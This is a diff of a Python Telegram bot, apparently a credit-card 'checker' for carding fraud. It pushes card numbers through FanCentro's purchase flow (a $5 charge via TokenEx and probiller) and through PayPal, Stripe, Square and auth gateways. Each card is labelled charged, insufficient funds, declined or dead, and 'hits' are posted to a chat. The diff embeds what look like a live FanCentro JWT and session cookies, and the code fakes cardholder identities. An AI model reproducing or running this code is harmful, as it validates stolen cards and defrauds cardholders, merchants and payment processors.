@@ -34,12 +34,11 @@ STRIPE_KEYS = {}
 pending_files = {}
 hit_counter = 0
 HIT_CHAT_ID = -1002429830194
-MY_IP = "41.235.10.195"
 
 # ==================== FanCentro Data ====================
-FAN_TOKEN = ""
+FAN_TOKEN = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3ODgxMTY3MTcsInBvcnRhbCI6ImZoIiwibmljayI6Imdvb2dsZTE3ODc5NzI0ODMiLCJ1X2lkIjoxNTExNDgxMTF9.DqfGmbb3eRDmOKHF9NAO2oq9aXayrDX901pjkxdjADU"
 FAN_COOKIE = "test_group=A; __Host-ss=v1OQJVKVZ5tDJqlr-i7idxYXn59H9cmKPxm8ruy0RxYmcxNzk1NzUxMjkzMTI0NzExNTAxNTMyMzQ2NjQ1; ats=eyJhIjo5NDk2LCJjIjoyMTk3MywibiI6MTQ0LCJzIjo3NDgsImUiOjExMTg2LCJwIjozfQ==; __Host-ageModal=1; d_uid=6bb555f4-bc65-a0bc-0a89-e3fa448c8616; d_uidb=6bb555f4-bc65-a0bc-0a89-e3fa448c8616; __Host-cookieConsent=v12qpc4X1ATgRNTHhxzu2RstiN7Rl692Mo39yNcM8CmgoxNzk1NzUxMzkyZXNzZW50aWFs; atsd=2e852eeb-438b-4e60-b0b2-18d5e07b3274; LBSERVERID=ded7975; atss=2e852eeb-438b-4e60-b0b2-18d5e07b3274; etaguid=undefined; d_fs=1; __Host-uviuil=v13jqF5b0mcsj2Xz11MEjyrSW1_oGyFdSAJugIBQQ1SzIxNzg4MTk1MjUyVWY2LXUyV1RMSlZDLXNKS1RMRTltSGR3SkJXbDE1Y3lweGRic2NHWQ..; atstrackPiece1=eyJhZmZVcmwiOiJmYW5jZW50cm8uY29tIiwiYWZmQ29kZSI6ImV5SmhJam81TkRrMkxDSmpJam95TVRrM015d2liaUk2TVRRMExDSnpJam8zTkRnc0ltVWlPakV4TVRnMkxDSndJam96ZlE9PSIsIm5ldHdvcmtDb2RlIjoiZmFuIiwiVUlEIjoiMWM4NjI2YzAtZDM5Ny00OGRmLThiOGEtNDQyY2ExNTNmMjgxIiwiU1VJRCI6IjJlODUyZWViLTQzOGItNGU2MC1iMGIyLTE4ZDVlMDdiMzI3NCIsImRhdGEiOnsidmFsdWUiOjEsImFiIjowLCJ1c2VyQWdlbnQiOiJNb3ppbGxhLzUuMCAoWDExOyBMaW51eCB4ODZfNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzkuMC4wLjAgU2FmYXJpLzUzNy4zNiIsImFkSWQiOjAsInJlZmVycmFsRG9tYWluIjoiZmFuY2VudHJvLmNvbSIsInJlZmVycmFsUGF0aCI6Imh0dHBzOi8vZmFuY2VudHJvLmNvbS8ifSwiZG1wIjp7ImRtcElkIjoiNmJiNTU1ZjQtYmM2NS1hMGJjLTBhODktZTNmYTQ0OGM4NjE2In0sImRlZmF1bHRDb2RlIjoiZXlKaElqbzVORGsyTENKaklqb3lNVGszTXl3aWJpSTZNVFEwTENKeklqbzNORGdzSW1VaU9qRXhNVGcyTENKd0lqb3pmUT09Iiwic3BsaXRBdGxhc0RhdGEiOnRydWUsImRpc2FibGUiOmZhbHNlLCJzdGVwcyI6Inw7ZDt2O3Q7dTt8O2FjO3Y7dDt8O2FjO3Q7fDthYzt0O3w7YWM7dDt8O2FjO3Q7fCIsInZvcnRleGRhdGEiOnsiX3NzY3JlZW4iOiI1NDAgeCAxMTcwIiwiX3Nicm93c2VyIjoiQ2hyb21lIiwiX3Ni; atstrackPiece2=cm93c2VyVmVyc2lvbiI6IjEzOS4wLjAuMCIsIl9ibW9iaWxlIjp0cnVlLCJfc29zIjoiQW5kcm9pZCIsIl9zb3NWZXJzaW9uIjoiMTAiLCJfc2ZsYXNoVmVyc2lvbiI6Im5vIGNoZWNrIiwiX3NsYW5ndWFnZXMiOiJhciIsImd1aWQiOiIiLCJod21vZGVsIjoiR2VuZXJpYyBBbmRyb2lkIiwiaHdmYW1pbHkiOiJHZW5lcmljIEFuZHJvaWQiLCJkZXZ0eXBlIjoiU21hcnRQaG9uZSJ9LCJ2aXNpdFN0YXJ0IjoxNzg4MDcwNzQxNDEyLCJjb2RlVHlwZSI6ImF0cyJ9; __Host-platform=v1qn0bwuxIZvNcYHQiCj5cNKcrrzuhktWekZGFGgT6CHwxNzk1ODg1NTE3cGM."
-FAN_SKU = "FEIFsfiUaPicbAfC1RRBW6AdGiJ6Ho4ohtWR1bdicMQ23J5j692e0JJEy5RzUIcYf6m9ywLd7KKQQNYaMhPUQiY-mJtkyFJ9MQzIW0qR-q4iIVm0qtDRgR0p85fK0MGXTCI6jcUA-Bk9iFy_iecP1oziBrxUHH3SoEo0rnF-"
+FAN_SKU = "cDKZ7Fty69OXX7E2aJj-hF8s3pFbBivoV97zZvq-4xbTt-OUNkTtpZh6_9o48sRdazBRWaM9Y5eSyj9Xeuksmvbc0C1_sum5OmeeUKPA_gjdb9ZhV-DhLYBN1NX0AQbYkpmPLxsBLDP3NssGQXQuel4wG7Owq6aJOvYvlyfp"
 
 try:
     with open('stripe_keys.json', 'r') as f:
@@ -121,140 +120,71 @@ async def get_bin_info(bin_number):
 # ==================== FanCentro Functions ====================
 def fan_refresh_token():
     global FAN_TOKEN
-    h = {
-        'authorization': f'Bearer {FAN_TOKEN}',
-        'content-type': 'application/json',
-        'cookie': FAN_COOKIE,
-        'origin': 'https://fancentro.com',
-        'referer': 'https://fancentro.com/',
-        'user-agent': 'Mozilla/5.0',
-        'X-Forwarded-For': MY_IP,
-        'X-Real-IP': MY_IP,
-        'CF-Connecting-IP': MY_IP,
-        'True-Client-IP': MY_IP,
-    }
+    h = {'authorization': f'Bearer {FAN_TOKEN}', 'content-type': 'application/json', 'cookie': FAN_COOKIE, 'origin': 'https://fancentro.com', 'referer': 'https://fancentro.com/', 'user-agent': 'Mozilla/5.0'}
     p = {"withCredentials": True, "isRefreshToken": True}
     try:
         r = requests.post("https://fancentro.com/api/v1/api/refreshToken", json=p, headers=h, timeout=30)
         if r.status_code == 200:
             data = r.json()
-            if 'token' in data and data['token']:
-                FAN_TOKEN = data['token']
+            for key in ['token', 'jwt', 'access_token', 'refreshToken', 'accessToken']:
+                if key in data and data[key]:
+                    FAN_TOKEN = data[key]
+                    return True
+            auth = r.headers.get('authorization', '')
+            if auth:
+                FAN_TOKEN = auth.replace('Bearer ', '')
+                return True
+            match = re.search(r'eyJ[A-Za-z0-9\-\._]{50,}', r.text)
+            if match:
+                FAN_TOKEN = match.group(0)
                 return True
     except:
         pass
     return False
 
 def fan_headers():
-    return {
-        'authorization': f'Bearer {FAN_TOKEN}',
-        'content-type': 'application/json',
-        'cookie': FAN_COOKIE,
-        'origin': 'https://fancentro.com',
-        'referer': 'https://fancentro.com/chat',
-        'user-agent': 'Mozilla/5.0',
-        'X-Forwarded-For': MY_IP,
-        'X-Real-IP': MY_IP,
-        'CF-Connecting-IP': MY_IP,
-        'True-Client-IP': MY_IP,
-    }
-
-def fan_init():
-    p = {
-        "creditAmount":500,
-        "displayAmount":"5",
-        "displayAmountFormatted":"5,00 $",
-        "priceAmountUsd":5,
-        "taxDisclaimer":"",
-        "billingDisclaimer":"One time charge of 5,00 $. Will not rebill.",
-        "amount":5,
-        "taxAmount":0,
-        "totalAmount":5,
-        "taxDisplayType":1,
-        "taxApplicationId":"",
-        "taxRate":0,
-        "taxName":"",
-        "productSku":FAN_SKU,
-        "freeCreditsAmount":0,
-        "freeCreditsPercent":0,
-        "currency":"USD",
-        "currencySymbol":"$",
-        "creditAmountTotal":500,
-        "paymentType":"cc",
-        "paymentMethod":"cc",
-        "displayName":"CREDIT CARD",
-        "type":"credit",
-        "baseAmount":5,
-        "freeCreditAmount":0,
-        "price":"5"
-    }
-    r = requests.post("https://fancentro.com/api/v2/api/purchase/credits/init", json=p, headers=fan_headers(), timeout=30)
-    if r.status_code != 200:
-        return f"STATUS:{r.status_code}"
-    data = r.json()
-    mgpg = data.get('mgpgResponse')
-    if not mgpg:
-        return f"NO_MGPG: {json.dumps(data)[:300]}"
-    vurl = data.get('validationUrl', '')
-    pr = mgpg.get('nextAction', {}).get('extensions', {}).get('proxySettings', {}).get('settings', {})
-    return {
-        'sid': mgpg.get('sessionId'),
-        'cid': mgpg.get('correlationId'),
-        'jwt': mgpg.get('jwtToken'),
-        'vurl': vurl,
-        'akey': pr.get('authenticationKey'),
-        'ts': pr.get('timestamp'),
-        'tid': pr.get('identifier', '4023327228985313')
-    }
+    return {'authorization': f'Bearer {FAN_TOKEN}', 'content-type': 'application/json', 'cookie': FAN_COOKIE, 'origin': 'https://fancentro.com', 'referer': 'https://fancentro.com/chat', 'user-agent': 'Mozilla/5.0'}
 
 def fan_tokenize(s, card, cvv):
     p = {"TokenExID":s['tid'],"Origin":"https://fancentro.com","AuthenticationKey":s['akey'],"Timestamp":s['ts'],"Data":card,"CvvValue":cvv,"TokenScheme":"PCI","CvvOnly":"False","PCI":"True","ReturnHash":None,"use3DS":"False","EnforceLuhnCompliance":"true","CustomDataLuhnCheck":True}
-    h = {
-        'content-type':'application/json',
-        'origin':'https://htp.tokenex.com',
-        'referer':'https://htp.tokenex.com/iframe/v3',
-        'user-agent':'Mozilla/5.0',
-        'X-Forwarded-For': MY_IP,
-        'X-Real-IP': MY_IP,
-    }
+    h = {'content-type':'application/json','origin':'https://htp.tokenex.com','referer':'https://htp.tokenex.com/iframe/v3','user-agent':'Mozilla/5.0'}
     r = requests.post("https://htp.tokenex.com/iframe/v3", json=p, headers=h, timeout=30)
-    if r.status_code != 200:
-        return None
+    if r.status_code != 200: return None
     return r.json().get('token', '')
 
 def fan_pay(s, token, cvv, em, ey):
-    h = {
-        'Content-Type':'application/json',
-        'x-auth-token':s['jwt'],
-        'x-session-id':s['sid'],
-        'x-correlation-id':s['cid'],
-        'Origin':'https://fancentro.com',
-        'Referer':'https://fancentro.com/',
-        'User-Agent':'Mozilla/5.0',
-        'X-Forwarded-For': MY_IP,
-        'X-Real-IP': MY_IP,
-    }
+    h = {'Content-Type':'application/json','x-auth-token':s['jwt'],'x-session-id':s['sid'],'x-correlation-id':s['cid'],'Origin':'https://fancentro.com','Referer':'https://fancentro.com/','User-Agent':'Mozilla/5.0'}
     p = {"sessionId":s['sid'],"correlationId":s['cid'],"payment":{"paymentInformation":{"cardInformation":{"ccNumber":token,"cvv":cvv,"cardExpirationMonth":em,"cardExpirationYear":ey,"cardHolderInfo":{"firstName":"wafa","lastName":"bro","email":"Iadiitiomjs@gmail.com","countryCode":"US","zipCode":"10001"}}},"validationUrl":s['vurl']}}
     return requests.post("https://mgpg2.probiller.com/api/process", json=p, headers=h, timeout=30)
 
+def fan_init():
+    p = {"creditAmount":500,"displayAmount":"5","displayAmountFormatted":"5,00 $","priceAmountUsd":5,"taxDisclaimer":"","billingDisclaimer":"One time charge of 5,00 $. Will not rebill.","amount":5,"taxAmount":0,"totalAmount":5,"taxDisplayType":1,"taxApplicationId":"","taxRate":0,"taxName":"","productSku":FAN_SKU,"freeCreditsAmount":0,"freeCreditsPercent":0,"currency":"USD","currencySymbol":"$","creditAmountTotal":500,"paymentType":"cc","paymentMethod":"cc","displayName":"CREDIT CARD","type":"credit","baseAmount":5,"freeCreditAmount":0,"price":"5"}
+    r = requests.post("https://fancentro.com/api/v2/api/purchase/credits/init", json=p, headers=fan_headers(), timeout=30)
+    if r.status_code == 401:
+        fan_refresh_token()
+        r = requests.post("https://fancentro.com/api/v2/api/purchase/credits/init", json=p, headers=fan_headers(), timeout=30)
+    if r.status_code != 200:
+        return f"STATUS:{r.status_code} BODY:{r.text[:150]}"
+    data = r.json()
+    mgpg = data.get('mgpgResponse')
+    if not mgpg:
+        return f"NO_MGPG: {json.dumps(data)[:150]}"
+    pr = mgpg.get('nextAction', {}).get('extensions', {}).get('proxySettings', {}).get('settings', {})
+    return {'sid': mgpg.get('sessionId'), 'cid': mgpg.get('correlationId'), 'jwt': mgpg.get('jwtToken'), 'vurl': data.get('validationUrl'), 'akey': pr.get('authenticationKey'), 'ts': pr.get('timestamp'), 'tid': pr.get('identifier', '4023327228985313')}
+
 def fan_check_card(card, cvv, em, ey):
     fan_refresh_token()
-    time.sleep(2)
-    
     s = fan_init()
     if isinstance(s, str):
         return f"ERROR: {s}"
     if not s:
         return "ERROR: Init failed"
-    
     t = fan_tokenize(s, card, cvv)
     if not t:
         return "ERROR: TokenEx failed"
-    
     r = fan_pay(s, t, cvv, em, ey)
     if r.status_code != 200:
-        return f"ERROR {r.status_code}: {r.text[:200]}"
-    
+        return f"ERROR {r.status_code}: {r.text[:100]}"
     d = r.json()
     charges = d.get('invoice', {}).get('charges', [])
     if charges:
@@ -262,57 +192,29 @@ def fan_check_card(card, cvv, em, ey):
         status = c.get('status', '')
         reason = c.get('reason', '')
         error_msg = c.get('errorClassification', {}).get('groupMessage', '')
-        
-        if status == 'approved':
-            return "CHARGE 5$"
-        elif 'INSUFFICIENT' in reason.upper() or 'FUNDS' in reason.upper() or 'INSUFFICIENT' in error_msg.upper():
-            return "INSUFFICIENT_FUNDS"
-        elif status == 'decline':
-            if reason:
-                return f"DECLINED - {reason}"
-            elif error_msg:
-                return f"DECLINED - {error_msg}"
-            else:
-                return "DECLINED - Declined"
-        elif status == 'aborted':
-            if reason:
-                return f"DEAD - {reason}"
-            elif error_msg:
-                return f"DEAD - {error_msg}"
-            else:
-                return "DEAD - Data Validation Error"
-        else:
-            if reason:
-                return f"{status.upper()} - {reason}"
-            elif error_msg:
-                return f"{status.upper()} - {error_msg}"
-            else:
-                return f"{status.upper()}"
-    
-    next_action = d.get('nextAction', {})
-    reason = next_action.get('reason', '')
-    if reason:
-        return reason
-    
-    return "UNKNOWN ERROR"
+        if status == 'approved': return "CHARGE 5$"
+        elif 'INSUFFICIENT' in reason.upper() or 'FUNDS' in reason.upper() or 'INSUFFICIENT' in error_msg.upper(): return "INSUFFICIENT_FUNDS"
+        elif status == 'decline': return f"DECLINED - {reason}"
+        elif status == 'aborted': return f"DEAD - {reason}"
+        else: return f"{status} - {reason}"
+    return d.get('nextAction', {}).get('reason', 'Unknown')
 
 def fan_parse_line(line):
     line = line.strip()
-    parts = None
-    for sep in ['|', ',', ':', ';', '\t']:
+    for sep in ['|',',',':',';','\t']:
         if sep in line:
             parts = [p.strip() for p in line.split(sep) if p.strip()]
             break
-    if parts is None:
+    else:
         parts = line.split()
-    if len(parts) < 4:
-        return None
-    return parts[0], parts[3], parts[1].zfill(2), "20" + parts[2] if len(parts[2]) == 2 else parts[2]
-    # ==================== PayPal ====================
+    if len(parts) < 4: return None
+    return parts[0], parts[3], parts[1].zfill(2), "20"+parts[2] if len(parts[2])==2 else parts[2]
+
+# ==================== PayPal ====================
 class PayPalCommerce:
     def __init__(self, target_url):
-        self.first_name = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles", "Roger", "Noah", "Daniel", "Matthew", "Anthony", "Mark", "Steven", "Paul", "Andrew", "Joshua", "Kevin", "Brian", "Edward", "George", "Ronald", "Teresa", "Mary", "Patricia", "Jennifer", "Linda", "Elizabeth", "Barbara", "Susan", "Jessica", "Sarah", "Karen", "Nancy", "Lisa", "Betty", "Margaret", "Sandra", "Ashley", "Kimberly", "Emily", "Donna", "Michelle", "Carol", "Amanda", "Dorothy", "Melissa", "Deborah", "Stephanie", "Rebecca", "Sharon", "Laura", "Cynthia", "Kathleen", "Amy", "Angela", "Shirley"]
-        self.last_name = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez", "Morgan", "Wilson", "Anderson", "Taylor", "Thomas", "Moore", "Jackson", "Martin", "Lee", "Thompson", "White", "Harris", "Clark", "Lewis", "Walker", "Rath", "Hall", "Allen", "Young", "Hernandez", "King", "Wright", "Lopez", "Hill", "Scott", "Green", "Adams", "Baker", "Gonzalez", "Nelson", "Carter", "Mitchell", "Perez", "Roberts", "Turner", "Phillips", "Campbell", "Parker", "Evans", "Edwards"]
+        self.first_name = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles", "Roger", "Noah", "Daniel", "Matthew", "Anthony", "Mark", "Steven", "Paul", "Andrew", "Joshua", "Kevin", "Brian", "Edward", "George", "Ronald"]
+        self.last_name = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez", "Morgan", "Wilson", "Anderson", "Taylor", "Thomas", "Moore", "Jackson", "Martin", "Lee", "Thompson", "White", "Harris", "Clark", "Lewis", "Walker"]
         self.donation = "1.00"
         self.minimum_amount = "1.00"
         self.currency = "USD"
@@ -333,7 +235,7 @@ class PayPalCommerce:
         self.email = f"{random.choice(self.first_name)}{random.randint(100,999)}@gmail.com"
         self.is_valid_gateway = True
         self.paypal_responses = ['INSUFFICIENT_FUNDS', 'ORDER_NOT_APPROVED', 'TRANSACTION_REFUSED', 'PAYER_ACTION_REQUIRED', 'INSTRUMENT_DECLINED', 'CARD_DECLINED', 'PAYMENT_DENIED', 'PAYER_CANNOT_PAY', 'EXPIRED_CARD', 'INVALID_PAYMENT_METHOD', 'DO_NOT_HONOR', 'ACCOUNT_CLOSED', 'LOST_OR_STOLEN', 'CVV2_FAILURE', 'SUSPECTED_FRAUD', 'INVALID_ACCOUNT', 'REATTEMPT_NOT_PERMITTED', 'ACCOUNT_BLOCKED_BY_ISSUER', 'PICKUP_CARD_SPECIAL_CONDITIONS', 'GENERIC_DECLINE', 'COMPLIANCE_VIOLATION', 'TRANSACTION_NOT_PERMITTED', 'INVALID_TRANSACTION', 'RESTRICTED_OR_INACTIVE_ACCOUNT', 'SECURITY_VIOLATION', 'DECLINED_DUE_TO_UPDATED_ACCOUNT', 'INVALID_OR_RESTRICTED_CARD', 'EXPIRED_CREDIT_CARD', 'CRYPTOGRAPHIC_FAILURE', 'TRANSACTION_CANNOT_BE_COMPLETED', 'DECLINED_PLEASE_RETRY', 'TX_ATTEMPTS_EXCEED_LIMIT', 'PAYER_ACCOUNT_LOCKED_OR_CLOSED', 'DECLINED', 'CHARGE', 'UNPROCESSABLE_ENTITY', 'VALIDATION_ERROR', 'INVALID_REQUEST', 'AUTHENTICATION_FAILURE', 'NOT_AUTHORIZED', 'NOT_ENABLED_FOR_CARD_PROCESSING', 'CARD_TYPE_NOT_SUPPORTED', 'MERCHANT_NOT_ENABLED', 'PAYEE_NOT_ENABLED_FOR_CARD_PROCESSING', 'INVALID_CURRENCY', 'CURRENCY_NOT_SUPPORTED', 'AMOUNT_MISMATCH', 'ITEM_TOTAL_MISMATCH', 'TAX_TOTAL_MISMATCH', 'SHIPPING_TOTAL_MISMATCH', 'HANDLING_TOTAL_MISMATCH', 'INSURANCE_TOTAL_MISMATCH', 'SHIPPING_DISCOUNT_MISMATCH', 'INVALID_PAYER_ID', 'INVALID_PAYEE_ID', 'INVALID_RESOURCE_ID', 'INVALID_PARAMETER', 'INVALID_PARAMETER_SYNTAX', 'INVALID_STRING_LENGTH', 'INVALID_STRING_FORMAT', 'MISSING_REQUIRED_PARAMETER', 'DUPLICATE_REQUEST_ID', 'DUPLICATE_INVOICE_ID', 'MAX_NUMBER_OF_PAYMENT_ATTEMPTS_EXCEEDED', 'PAYEE_ACCOUNT_RESTRICTED', 'PAYEE_ACCOUNT_INVALID', 'PAYEE_ACCOUNT_LOCKED_OR_CLOSED', 'PAYEE_BLOCKED_TRANSACTION', 'PAYER_BLOCKED_TRANSACTION', 'PAYER_ACCOUNT_RESTRICTED', 'PAYER_ACCOUNT_INVALID', 'UNSUPPORTED_INTENT', 'UNSUPPORTED_PAYMENT_INSTRUMENT', 'UNSUPPORTED_SHIPPING_TYPE', 'SHIPPING_ADDRESS_INVALID', 'SHIPPING_OPTION_NOT_SUPPORTED', 'MULTIPLE_SHIPPING_ADDRESS_NOT_SUPPORTED', 'MULTIPLE_SHIPPING_OPTION_SELECTED', 'INVALID_PICKUP_ADDRESS', 'PICKUP_ADDRESS_INVALID', 'INVALID_SHIPPING_ADDRESS', 'AUTHORIZATION_VOIDED', 'AUTHORIZATION_EXPIRED', 'AUTHORIZATION_DENIED', 'AUTHORIZATION_CAPTURED', 'CAPTURE_FULLY_REFUNDED', 'CAPTURE_PARTIALLY_REFUNDED', 'REFUND_NOT_PERMITTED', 'REFUND_DENIED', 'REFUND_FAILED', 'TRANSACTION_ALREADY_REFUNDED', 'TRANSACTION_LIMIT_EXCEEDED', 'BILLING_AGREEMENT_NOT_FOUND', 'BILLING_AGREEMENT_CANCELLED', 'BILLING_AGREEMENT_EXPIRED', 'BILLING_AGREEMENT_FAILED', 'INTERNAL_SERVER_ERROR', 'SERVICE_UNAVAILABLE', 'RESOURCE_NOT_FOUND', 'METHOD_NOT_ALLOWED', 'NOT_ACCEPTABLE', 'UNSUPPORTED_MEDIA_TYPE', 'RATE_LIMIT_REACHED', 'INSUFFICIENT_PERMISSIONS', 'INVALID_ACCESS_TOKEN', 'EXPIRED_ACCESS_TOKEN', 'MALFORMED_REQUEST', 'UNKNOWN_ERROR']
-        self.user_agents = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0']
+        self.user_agents = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36']
         self.ua_index = 0
         self._init_and_extract()
         self._get_access_token()
@@ -1014,7 +916,8 @@ def check_auth_sync(card):
             session.close()
         except:
             pass
-            # ==================== Send Hit ====================
+
+# ==================== Send Hit ====================
 async def send_hit(context, chat_id, hit_counter, username, status_text, response, gateway_name):
     hit_text = f"""⚡ 𝗵𝗶𝘁 𝗗𝗲𝘁𝗲𝗰𝘁𝗲𝗱 #{hit_counter} 📌
 - - - - - - - - - - - - - - - - - - - - - -
@@ -1029,7 +932,7 @@ async def send_hit(context, chat_id, hit_counter, username, status_text, respons
     except:
         pass
 
-# ==================== Format PayPal ====================
+# ==================== Format Functions ====================
 async def format_response(card_full, status, response, taken, gateway_url, gateway_num, user_id, mode="Single"):
     bin_number = card_full.split("|")[0][:6]
     info, bank, country = await get_bin_info(bin_number)
@@ -1065,7 +968,6 @@ async def format_response(card_full, status, response, taken, gateway_url, gatew
 - - - - - - - - - - - - - - - - - - - - - -
 🤖 checker v1""")
 
-# ==================== Format Stripe ====================
 async def format_stripe_response(card_full, result, taken, user_id, mode="Single"):
     bin_number = card_full.split("|")[0][:6]
     info, bank, country = await get_bin_info(bin_number)
@@ -1102,7 +1004,6 @@ async def format_stripe_response(card_full, result, taken, user_id, mode="Single
 - - - - - - - - - - - - - - - - - - - - - -
 🤖 checker v1""")
 
-# ==================== Format Square ====================
 async def format_square_response(card_full, result, taken, user_id, mode="Single"):
     bin_number = card_full.split("|")[0][:6]
     info, bank, country = await get_bin_info(bin_number)
@@ -1135,7 +1036,6 @@ async def format_square_response(card_full, result, taken, user_id, mode="Single
 - - - - - - - - - - - - - - - - - - - - - -
 🤖 checker v1""")
 
-# ==================== Format Auth ====================
 async def format_auth_response(card_full, result_dict, taken, user_id, mode="Single"):
     bin_number = card_full.split("|")[0][:6]
     info, bank, country = await get_bin_info(bin_number)
@@ -1170,7 +1070,6 @@ async def format_auth_response(card_full, result_dict, taken, user_id, mode="Sin
 - - - - - - - - - - - - - - - - - - - - - -
 🤖 checker v1""")
 
-# ==================== Format FanCentro ====================
 async def fan_format_response(card_full, result, user_id, mode="Single"):
     bin_number = card_full.split("|")[0][:6]
     info, bank, country = await get_bin_info(bin_number)
@@ -1198,7 +1097,8 @@ async def fan_format_response(card_full, result, user_id, mode="Single"):
 👤 Req By: <code>{user_id}</code> ({user_status})
 - - - - - - - - - - - - - - - - - - - - - -
 🤖 checker v1""")
-# ==================== Start ====================
+
+# ==================== Handlers ====================
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     ALL_USERS.add(user_id)
@@ -1211,7 +1111,6 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     ]
     await update.message.reply_text(premium_emoji(f"⚡ Welcome! @{username} ⚡\n- - - - - - - - - - - - - - - - - - - - - -\n🚀 Bot Status: Online"), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
 
-# ==================== Callbacks ====================
 async def free_cmds_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
@@ -1290,7 +1189,6 @@ async def back_to_start_callback(update: Update, context: ContextTypes.DEFAULT_T
     ]
     await query.edit_message_text(premium_emoji(f"⚡ Welcome! @{username} ⚡\n- - - - - - - - - - - - - - - - - - - - - -\n🚀 Bot Status: Online"), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
 
-# ==================== Gateways Callbacks ====================
 async def show_gateways(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id not in ADMINS: return
     if not GATEWAYS:
@@ -1347,7 +1245,6 @@ async def close_gateways_callback(update: Update, context: ContextTypes.DEFAULT_
     await query.answer()
     await query.delete_message()
 
-# ==================== Commands ====================
 async def cmds(update: Update, context: ContextTypes.DEFAULT_TYPE):
     commands_text = """👑 ADMIN:
 • /add [url] - Add PayPal gateway
@@ -1383,7 +1280,6 @@ async def cmds(update: Update, context: ContextTypes.DEFAULT_TYPE):
 • /code [key] - Activate VIP"""
     await update.message.reply_text(premium_emoji(commands_text), parse_mode="HTML")
 
-# ==================== PP Handler ====================
 async def pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
     global hit_counter, gateway_index
     user_id = update.effective_user.id
@@ -1418,7 +1314,6 @@ async def pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
         status_text = "🔥 Charge" if status == "approved" else "💵 Insufficient Funds"
         await send_hit(context, update.effective_chat.id, hit_counter, username, status_text, response, gateway_name)
 
-# ==================== ST Handler ====================
 async def st_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
     global hit_counter
     user_id = update.effective_user.id
@@ -1439,7 +1334,8 @@ async def st_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
     msg = await update.message.reply_text(premium_emoji("💳 Checking Stripe..."), parse_mode="HTML")
     start_time = time.time()
     loop = asyncio.get_event_loop()
-    result = await loop.run_in_executor(None, check_stripe_sync, card)
+    first_key_id = list(STRIPE_KEYS.keys())[0] if STRIPE_KEYS else "1"
+    result = await loop.run_in_executor(None, check_stripe_sync, card, first_key_id)
     taken = round(time.time() - start_time, 2)
     text = await format_stripe_response(card, result, taken, user_id, "Single")
     await msg.edit_text(text, parse_mode="HTML")
@@ -1455,7 +1351,6 @@ async def st_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
         username = user.username or user.first_name or "Unknown"
         await send_hit(context, update.effective_chat.id, hit_counter, username, "💵 Insufficient Funds", result, "Stripe")
 
-# ==================== SQ Handler ====================
 async def sq_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
     global hit_counter
     user_id = update.effective_user.id
@@ -1488,7 +1383,6 @@ async def sq_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
         username = user.username or user.first_name or "Unknown"
         await send_hit(context, update.effective_chat.id, hit_counter, username, "💵 Insufficient Funds", result, "Square")
 
-# ==================== Auth Handler ====================
 async def auth_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
     global hit_counter
     user_id = update.effective_user.id
@@ -1517,7 +1411,6 @@ async def auth_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
         username = user.username or user.first_name or "Unknown"
         await send_hit(context, update.effective_chat.id, hit_counter, username, "🔥 Approved", result_dict.get('message', ''), "Auth $0")
 
-# ==================== CB Handler (FanCentro) ====================
 async def cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
     global hit_counter
     user_id = update.effective_user.id
@@ -1550,7 +1443,7 @@ async def cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
         username = user.username or user.first_name or "Unknown"
         status_text = "🔥 Charge 5$" if "CHARGE" in result_upper else "💵 Insufficient Funds"
         await send_hit(context, update.effective_chat.id, hit_counter, username, status_text, result, "FanCentro")
-        # ==================== File Panel ====================
+
 def can_user_check(user_id, mode="file"):
     if user_id in ADMINS: return True
     if BANNED_USERS.get(user_id): return False
